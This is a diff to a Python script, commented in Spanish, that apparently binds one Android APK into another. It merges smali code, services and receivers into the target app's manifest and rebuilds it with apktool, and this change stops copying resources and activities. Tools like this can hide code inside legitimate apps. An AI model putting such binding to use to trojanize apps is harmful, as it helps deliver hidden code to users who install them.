@@ -2,8 +2,8 @@
 TODO
     * Controlar excepciones
     * Limitaciones:
-        - Copia todos los recursos desde el apk binder hacia el apk target excepto los ya existentes en este.
-        - La limitacion anterior puede llevar a que las actividades no se lancen correctamente debido a la falta de recursos.
+        - No se copian los recursos debido a problemas con la recompilacion. 
+        - No se copian las actividades debido a que hacen uso de recursos y pueden generar problemas de recompilacion.
 '''
 
 __version__ = "v0.1"
@@ -30,7 +30,7 @@ NO_COPY = \
         os.path.join("smali", "android"),
         "AndroidManifest.xml",
         "apktool.yml",
-        #os.path.join(" ", "res", "")
+        os.path.join(" ", "res", "")
     ]
 
 def main():
@@ -109,7 +109,7 @@ def main():
     Compiling
     '''
     #Compilar apk bindeado
-    subprocess.call([os.path.join("apktool", apktool_bin), "b", target_dir_smali, "Bind_" + target_apk ])
+    subprocess.call([os.path.join("apktool", apktool_bin), "b", target_dir_smali, "Bind_" + target_package + ".apk" ])
 
     #Eliminamos directorios temporales de trabajo
     shutil.rmtree(target_dir_smali)
@@ -179,6 +179,7 @@ def merge_manifest(source_manifest, target_manifest):
     for child in child_application[0].getElementsByTagName("service"):
         t_manifest.getElementsByTagName("application")[0].appendChild(child)
 
+	'''
     #Agregamos activities
     for child in child_application[0].getElementsByTagName("activity"):
         t_manifest.getElementsByTagName("application")[0].appendChild(child)
@@ -186,7 +187,8 @@ def merge_manifest(source_manifest, target_manifest):
     #Agregamos activity-alias
     for child in child_application[0].getElementsByTagName("activity-alias"):
         t_manifest.getElementsByTagName("application")[0].appendChild(child)
-
+	'''
+	
     #Agregamos receivers
     for child in child_application[0].getElementsByTagName("receiver"):
         t_manifest.getElementsByTagName("application")[0].appendChild(child)
